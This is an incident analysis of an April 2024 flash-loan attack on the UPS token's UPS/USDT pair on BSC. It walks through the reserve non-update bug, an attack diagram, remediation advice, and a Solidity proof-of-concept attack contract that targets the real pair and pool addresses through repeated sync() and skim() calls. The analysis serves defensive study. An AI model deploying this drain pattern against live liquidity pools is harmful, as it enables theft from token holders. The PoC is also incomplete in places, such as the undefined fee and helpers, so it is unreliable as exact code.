# UPS — Reserve Non-Update Exploit via Repeated sync/skim Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | UPS |
| **Chain** | BSC |
| **Loss** | ~$28,000 |
| **Vulnerable Pair** | [UPS/USDT 0xA2633ca9](https://bscscan.com/address/0xA2633ca9Eb7465E7dB54be30f62F577f039a2984) |
| **V3 Pool** | [0x4f31Fa98](https://bscscan.com/address/0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb) |
| **UPS Token** | [0x3dA48286](https://bscscan.com/address/0x3dA4828640aD831F3301A4597821Cc3461B06678) |
| **Root Cause** | When UPS tokens are transferred to the pair, the reserves are not updated, allowing repeated extraction of the difference between actual balance and reserves via repeated `sync()` + `skim()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/UPS_exp.sol) |

---

## 1. Vulnerability Overview

The UPS token has the property that its internal `_update()` logic does not update the pair's reserves upon transfer. The attacker borrowed 3.5M USDT via a V3 flash loan, transferred it to the pair and called `sync()` to inflate the USDT reserves, then swapped to acquire UPS tokens. Since transferring UPS back to the pair does not update the UPS reserves, the attacker repeatedly extracted the difference using `skim()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: pair reserves not updated after UPS transfer
contract UPSToken {
    function _transfer(address from, address to, uint256 amount) internal {
        _balances[from] -= amount;
        _balances[to] += amount;
        // No _update() call — even when the pair receives tokens, reserves remain unchanged
        // pair.balance > pair.reserve → extractable via skim()
    }
}

// Uniswap V2 Pair
// skim(): transfers (balance - reserve) to recipient
// sync(): updates reserve = balance

// Attack pattern:
// 1. Transfer UPS to pair → balance increases, reserve unchanged
// 2. skim() → receive (balance - reserve) = the transferred UPS amount
// → Repeatable (UPS is not consumed)

// ✅ Safe code: force pair reserve update after transfer
function _transfer(address from, address to, uint256 amount) internal {
    _balances[from] -= amount;
    _balances[to] += amount;
    // Trigger sync() if recipient is a Uniswap pair
    if (isPair[to]) {
        IPancakePair(to).sync();
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: UPS_decompiled.sol
contract UPS {
    function sync() external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] V3 Flash Loan: borrow 3,500,000 USDT
  │
  ├─→ [2] Transfer USDT to UPS/USDT pair → sync()
  │         └─ USDT reserves increase significantly
  │
  ├─→ [3] Swap USDT → UPS (via router)
  │
  ├─→ [4] Transfer UPS to pair (reserves not updated)
  │         └─ pair.UPS_balance > pair.UPS_reserve
  │
  ├─→ [5] pair.skim(attacker) × 10 times
  │         └─ each call extracts (UPS_balance - UPS_reserve)
  │
  ├─→ [6] pair.swap(UPS→USDT) × 3 times
  │
  ├─→ [7] Repay V3 flash loan
  │
  └─→ [8] ~$28K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IPancakePair {
    function skim(address to) external;
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUniV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    IUniV3       constant v3Pool = IUniV3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    IPancakePair constant pair   = IPancakePair(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);
    IERC20 constant UPS  = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function testExploit() external {
        v3Pool.flash(address(this), 3_500_000e18, 0, "");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [1] Transfer USDT to pair + sync (inflate USDT reserves)
        USDT.transfer(address(pair), 3_500_000e18);
        pair.sync();

        // [2] Swap USDT → UPS
        swapUSDTToUPS();

        // [3] Transfer UPS to pair (reserves not updated)
        uint256 upsBal = UPS.balanceOf(address(this));
        UPS.transfer(address(pair), upsBal);

        // [4] skim × 10 (repeated UPS extraction)
        for (uint i = 0; i < 10; i++) {
            pair.skim(address(this));
            // Re-transfer UPS back to pair
            UPS.transfer(address(pair), UPS.balanceOf(address(this)) / 2);
        }

        // [5] swap × 3 (UPS → USDT)
        for (uint i = 0; i < 3; i++) {
            uint256 upsNow = UPS.balanceOf(address(this));
            UPS.transfer(address(pair), upsNow);
            (uint112 r0, uint112 r1,) = pair.getReserves();
            uint256 usdtOut = getAmountOut(upsNow, r0, r1);
            pair.swap(0, usdtOut, address(this), "");
        }

        // [6] Repay V3 flash loan
        USDT.transfer(address(v3Pool), 3_500_000e18 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reserve non-update token + repeated skim extraction |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + sync + repeated skim) |
| **DApp Classification** | Custom token + Uniswap V2 pair |
| **Impact** | Pair reserve drainage (~$28K) |

## 6. Remediation Recommendations

1. **Update reserves after transfer**: Automatically trigger `sync()` when transferring tokens to a pair
2. **Disable skim**: Disable the `skim()` function on pairs with fee-on-transfer or custom token logic
3. **Remove transfer taxes**: Separate fee/custom transfer logic from AMM interactions
4. **Special handling for pair addresses**: Immediately update reserves when transferring to a pair address

## 7. Lessons Learned

- If a token's `_transfer()` logic does not trigger `reserve` updates on the AMM pair, repeated extraction via `skim()` becomes possible.
- The `sync()` + `skim()` combination is a recurring attack pattern on BSC, seen with UPS, ATM, SATX, and others.
- When listing a custom token on a standard AMM, it is essential to verify that the `transfer()` logic does not violate the AMM's accounting invariants.